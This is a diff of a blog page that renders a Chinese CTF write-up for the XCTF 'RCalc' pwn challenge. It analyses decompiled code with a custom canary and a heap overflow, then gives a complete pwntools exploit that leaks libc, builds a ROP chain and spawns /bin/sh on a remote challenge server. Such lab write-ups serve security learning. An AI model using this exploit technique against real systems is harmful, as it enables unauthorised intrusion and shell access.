@@ -145,198 +145,242 @@
             <div class="main-content">
 
                 
-                    $avatarWidth = 46px;
-$arrow-icon-width = 16px;
-$post-nav-max-width = 220px;
-$article-title-font-size = 1.6rem;
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
 
-.article-content-container {
+        <div class="article-title">
+            <span class="title-hover-animation">RCalc</span>
+        </div>
 
-  keep-container(false, 0, 0, 30px, 30px);
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/ai.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">196082</span>
+                        
+                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2021-12-26 18:18:35
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/pwn-xctf/">pwn-xctf</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
 
-  .article-title {
-    color: var(--second-text-color);
-    font-weight: 600;
-    font-size: $article-title-font-size;
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>911 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>4 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
 
-    +keep-tablet() {
-      font-size: $article-title-font-size * 0.9;
-    }
+                    </div>
+                </div>
+            </div>
+        
 
-    +keep-mobile() {
-      font-size: $article-title-font-size * 0.8;
-    }
-  }
+        <div class="article-content markdown-body">
+            <h3 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h3><p>今年冲50篇博客看来是悬了，这玩意数论是真要了我的老命了 : (</p>
+<p>是真被xctf搞无语了，有时候环境创建不了就不说，居然题目给的libc版本和解题需要的版本不一致，去问Gyan大神估计都觉得我是个傻逼了。。。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20211226181931393.png"
+                      alt="image-20211226181931393"
+                ></p>
+<p>只打开了nx</p>
+<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_400A06();</span><br><span class="line">  alarm(<span class="number">0x78</span>u);</span><br><span class="line">  sub_400FA2();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">sub_400A06</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  qword_6020F8 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_6020F8 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  qword_6020F0 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_6020F0 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  *qword_6020F8 = <span class="number">0LL</span>;</span><br><span class="line">  v0 = qword_6020F8;</span><br><span class="line">  *(v0 + <span class="number">8</span>) = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  *qword_6020F0 = <span class="number">0LL</span>;</span><br><span class="line">  v1 = qword_6020F0;</span><br><span class="line">  result = <span class="built_in">malloc</span>(<span class="number">0x320</span>uLL);</span><br><span class="line">  *(v1 + <span class="number">8</span>) = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-  .article-header {
-    position: relative;
-    padding-left: $avatarWidth;
-    width: 100%;
-    height: $avatarWidth;
-    box-sizing: border-box;
+<p>可以看到题目创建了几个chunk但是，注意一下chunk的创建顺序和结构就好</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400FA2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = sub_400AAB();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your name pls: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s!\nWelcome to RCTF 2017!!!\n&quot;</span>, v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s try our smart calculator&quot;</span>);</span><br><span class="line">  sub_400E72();</span><br><span class="line">  result = sub_400B92();</span><br><span class="line">  <span class="keyword">if</span> ( result != v2 )</span><br><span class="line">    sub_400BD4();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    .avatar {
-      position: absolute;
-      top: 0
-      left: 0;
-      width: $avatarWidth;
-      height: $avatarWidth;
-      padding: 1px;
-      box-sizing: border-box;
-      border: 1px solid var(--border-color);
-      border-radius: 50%;
+<p>这里存在一个栈溢出就是__isoc99_scanf(“%s”, v1);但是这里存在一个自主实现的canary保护</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400AAB</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ptr; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *qword_6020F0 )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = *(*(qword_6020F0 + <span class="number">8</span>) + <span class="number">8LL</span> * *qword_6020F0 - <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    stream = fopen(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fread(&amp;ptr, <span class="number">1uLL</span>, <span class="number">4uLL</span>, stream);</span><br><span class="line">    fclose(stream);</span><br><span class="line">  &#125;</span><br><span class="line">  srand(ptr);</span><br><span class="line">  v5 = rand();</span><br><span class="line">  v0 = v5 &lt;&lt; <span class="number">32</span>;</span><br><span class="line">  v5 = v0 | rand();</span><br><span class="line">  v1 = *(qword_6020F0 + <span class="number">8</span>);</span><br><span class="line">  v2 = (*qword_6020F0)++;</span><br><span class="line">  *(v1 + <span class="number">8</span> * v2) = v5;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-      img {
-        border-radius: 50%;
-        width: 100%;
-        height: 100%;
-        background: var(--avatar-background-color);
-      }
+<p>首先是这个，可以看到是将随机值放到chunk里面然后放到栈里面</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400B92</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> *(*(qword_6020F0 + <span class="number">8</span>) + <span class="number">8LL</span> * (*qword_6020F0)-- - <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    }
+<p>通过这个拿到canary的值然后比较，自主实现的一个canary。</p>
+<p>我们再看在计算内部函数如果保存结果的话是保存在哪的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400E39</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = *(qword_6020F8 + <span class="number">8</span>);</span><br><span class="line">  v2 = (*qword_6020F8)++;</span><br><span class="line">  result = a1;</span><br><span class="line">  *(v1 + <span class="number">8</span> * v2) = a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
-    .info {
-      padding: 2px 0;
-      margin-left: 10px;
-      box-sizing: border-box;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      width: 100%;
-      height: 100%;
-
-      .author {
-        font-weight: 600;
-        font-size: 1.18rem;
-        display: flex;
-        align-items: center;
-
-        .name {
-          color: var(--default-text-color);
-        }
-
-        .author-label {
-          margin-left: 10px;
-          font-size: 0.8rem;
-          font-weight: 500;
-          padding: 0 5px;
-          border-radius: 5px;
-          color: #fff;
-          background: var(--selection-color);
-        }
-
-      }
-    }
-
-  }
-
-
-  .article-header, .article-header-meta-info {
-    margin-top: 16px;
-    +keep-tablet() {
-      transform: scale(0.9);
-      transform-origin: left top;
-    }
-  }
-
-
-  .article-content {
-    margin-top: $component-spacing-value;
-    padding-bottom: 10px;
-    word-wrap: break-word;
-    border-bottom: 1px solid var(--border-color);
-    color: var(--default-text-color);
-  }
-
-  .post-copyright-info {
-    margin-top: $component-spacing-value;
-    width: 100%;
-  }
-
-  .article-nav {
-    height: 40px;
-    margin-top: $component-spacing-value;
-
-    .article-prev, .article-next {
-      max-width: $post-nav-max-width;
-      height: 100%;
-      box-sizing: border-box;
-
-      keep-container(true, 1.03, 1.03, 10px, 0);
-
-      a {
-        position: relative;
-        display: block;
-        width: 100%;
-        height: 100%;
-        box-sizing: border-box;
-
-        &.prev {
-          padding-left: $arrow-icon-width;
-        }
-
-        &.next {
-          padding-right: $arrow-icon-width;
-        }
-
-        .arrow-icon {
-          position: absolute;
-          top: 0;
-          height: 100%;
-          width: $arrow-icon-width;
-
-          &.left {
-            left: 0;
-          }
-
-          &.right {
-            right: 0;
-          }
-        }
-
-        .title {
-          width: 100%;
-          height: 100%;
-        }
-      }
-
-    }
-
-    .article-prev {
-      float: left;
-    }
-
-    .article-next {
-      float: right;
-    }
-
-    .post-nav-item {
-      display: none;
-
-      +keep-tablet() {
-        display: inline-block;
-      }
-
-    }
+<p>可以看到也是保存在chunk里面的，现在画个图基本就可以看出来了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20211226183348933.png"
+                      alt="image-20211226183348933"
+                ></p>
+<p>上面储存canary的值*(qword_6020F0 + 8)是放在这样一个chunk里面也就是最下面0x300的chunk里面的</p>
+<p>储存计算结果的值是放在*(qword_6020F8 + 8)这个chunk里面也就是0x100</p>
+<p>并且程序没有检测堆溢出，所以我们可以通过堆溢出覆盖掉下面存的canary然后就直接构造ROPgadget</p>
+<p>(需要注意的是不能使用puts_plt和puts_got，存在0x20会出现截断)</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./RCalc&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./RCalc&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>, <span class="number">60200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401123</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">__libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">ret_addr = <span class="number">0x00000000004007fe</span></span><br><span class="line">main_addr = <span class="number">0x401036</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input your name pls: &#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x110</span>-<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>) + \</span><br><span class="line">    p64(pop_rdi)+p64(__libc_start_main_got)+p64(printf_plt)+p64(main_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">one, two</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input 2 integer: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(one), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(two), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Save the result?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="number">0x100</span>/<span class="number">0x8</span>)+<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">__libc_start_main_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, __libc_start_main_addr)</span><br><span class="line">libc_base = __libc_start_main_addr-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bin_sh_addr)</span><br><span class="line"><span class="built_in">print</span>(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input your name pls: &#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x110</span>-<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rdi) + \</span><br><span class="line">    p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="number">0x100</span>/<span class="number">0x8</span>)+<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
 
-    .post-nav-title-item {
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
+        </div>
 
-      +keep-tablet() {
-        display: none;
-      }
-    }
+        
 
-  }
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/01/01/nobug/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">nobug</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/12/20/hacknote/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">hacknote</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;评论</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '😜若有问题请各位大师傅留言评论',
+                    lang: 'zh-CN'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = '196082';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('false') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
 
 
-}
 
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+</div>
 
 
                 
